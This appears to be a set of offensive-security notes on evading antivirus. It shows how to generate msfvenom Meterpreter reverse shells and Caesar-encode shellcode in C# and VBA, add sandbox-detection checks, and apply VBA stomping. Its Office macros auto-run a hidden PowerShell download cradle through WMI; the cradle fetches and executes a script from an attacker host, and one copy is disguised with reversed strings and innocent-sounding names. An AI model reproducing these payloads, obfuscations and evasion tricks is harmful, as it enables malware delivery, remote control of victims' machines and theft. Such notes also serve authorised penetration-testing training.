## C#

### Using Caesar Substitution
1. `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f csharp`
2. In Visual Studio, new Console App, paste this code in Main(). Make sure the namespace title is same as the title of the project:
```
<output from 1>
    
byte[] encoded = new byte[buf.Length];
for(int i = 0; i < buf.Length; i++)
{
    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
}

StringBuilder hex = new StringBuilder(encoded.Length * 2);
foreach(byte b in encoded)
{
    hex.AppendFormat("0x{0:x2}, ", b);
}

Console.WriteLine("The payload is: " + hex.ToString());
```
3. Make sure the dropdowns on the left of 'Start' at the top bar is set to 'Release' and 'x64' (or other depending on victim OS)
4. Click Build -> Build Solution
5. Find the .exe in `<project folder>/bin/x64/Release` and run it in command line. The bytes should be printed out.
6. Replace your old payload with this new encoded payload
7. Below the payload, add this code to be able to decode the payload:
```
for(int i = 0; i < buf.Length; i++)
{
    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
}
```
8. Remember to rebuild your solution to update your c# exe

### Add a sleep timer
Heuristic tests often timeskip past any time.sleep commands. So we use time.now before and after time.sleep(2), and if 2 seconds haven't actually passed, it means we are in a heuristic test and avoid running anything dangerous to get detected.

Add these to the start of your C# code:
```
...
[DllImport("kernel32.dll")]
static extern void Sleep(uint dwMilliseconds);
        
static void Main(string[] args)
{
    DateTime t1 = DateTime.Now;
    Sleep(2000);
    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
    if(t2 < 1.5)
    {
        return;
    }
...
```

### Use non-emulated APIs
Some lesser known Win32 APIs are not emulated in heuristic tests, eg VirtualAllocExNuma. We use those APIs, and if the functions don't work, we know we are in a heuristic test.

Add these to the start of your C# code:
```
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, 
uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

[DllImport("kernel32.dll")]
static extern IntPtr GetCurrentProcess();

IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
if(mem == null)
{
    return;
}
```

## VBA

### Caesar
1. `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f csharp`
2. In Visual Studio, new Console App, paste this code in Main(). Make sure the namespace title is same as the title of the project:
```
<output from 1>
    
byte[] encoded = new byte[buf.Length];
for(int i = 0; i < buf.Length; i++)
{
    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
}

uint counter = 0;

StringBuilder hex = new StringBuilder(encoded.Length * 2);
foreach(byte b in encoded)
{
    hex.AppendFormat("{0:D}, ", b);
    counter++;
    if(counter % 50 == 0)
    {
        hex.AppendFormat("_{0}", Environment.NewLine);
    }
}

Console.WriteLine("The payload is: " + hex.ToString());
```
3. Make sure the dropdowns on the left of 'Start' at the top bar is set to 'Release' and 'x64' (or other depending on victim OS)
4. Click Build -> Build Solution
5. Find the .exe in `<project folder>/bin/x64/Release` and run it in command line. The bytes should be printed out.
6. Replace your old payload with this new encoded payload
7. Below the payload, add this code to be able to decode the payload:
```
For i = 0 To UBound(buf)
    buf(i) = buf(i) - 2
Next i
```

### Sleep timer
Sleep timer for VBA. More info refer [here](#add-a-sleep-timer).
```
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
...
Dim t1 As Date
Dim t2 As Date
Dim time As Long

t1 = Now()
Sleep (2000)
t2 = Now()
time = DateDiff("s", t1, t2)

If time < 2 Then
    Exit Function
End If
...
```

### Checking document name
Document is often renamed during heuristic testing

```
If ActiveDocument.Name <> "<doc name>" Then
  Exit Function
End If
```

### Reverse string
StrReverse() in VBA. Use on the sus parts of the code, like the PS download cradle or the payload in bytes

However AV companies has noted the notorious use of this function in malware, and flags even clean code based on the number of StrReverse that it uses. As a result, minimise its use and use more innocent sounding variable names:
```
Function bears(cows)
    bears = StrReverse(cows)
End Function

Sub Mymacro()
Dim strArg As String
strArg = bears("))'txt.nur/021.911.861.291//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop")

GetObject(bears(":stmgmniw")).Get(bears("ssecorP_23niW")).Create strArg, Null, Null, pid
End Sub
```

### Stomping
There is a cached version of VBA code in documents known as P-code. Its specific to the Microsoft product version so this method will only work for victims with the same version of the Microsoft product. You can evade AV by manually removing the actual VBA source code and relying entirely on the P-code to execute your shell.

0. First have your VBA shellcode ready (the whole VBA code, including whatever else obfuscations you want)
1. Use [FlexHex](https://www.heaventools.com/download-hex-editor.htm)
2. File > Open > OLE Compound File...
3. In navigation panel (bottom left), go to Macros > VBA > NewMacros
4. Scroll down (near the bottom) until you see "Attribute_VBName="NewMacros"
5. Select the bytes starting from there until the end
6. Edit > Insert Zero Block and accept everything

### Hiding powershell download cradles

#### Using WMI
AV detects powershell running as a process under office product and flags it. Using this will make it run under Wmiprvse.exe instead.

1. Use the .ps1 reverse shell [here](./Meterpreter#ps1-reverse-shell) (follow step 2 and 3)
2.
```
Sub MyMacro
  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://<kali ip>:<http port>/run.ps1'))"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    Mymacro
End Sub
```

#### Caesar shifting the download cradle
1. Use the .ps1 reverse shell [here](./Meterpreter#ps1-reverse-shell) (follow step 2 and 3)
2. Run this in powershell:
```powershell
$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://<kali ip>:<http port>/run.ps1'))"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output
```
3. Then this in VBA:
```
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Function MyMacro()
    Dim Apples As String
    Dim Water As String
    
    Apples = "<output from 1>"
    Water = Nuts(Apples)
    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function
```
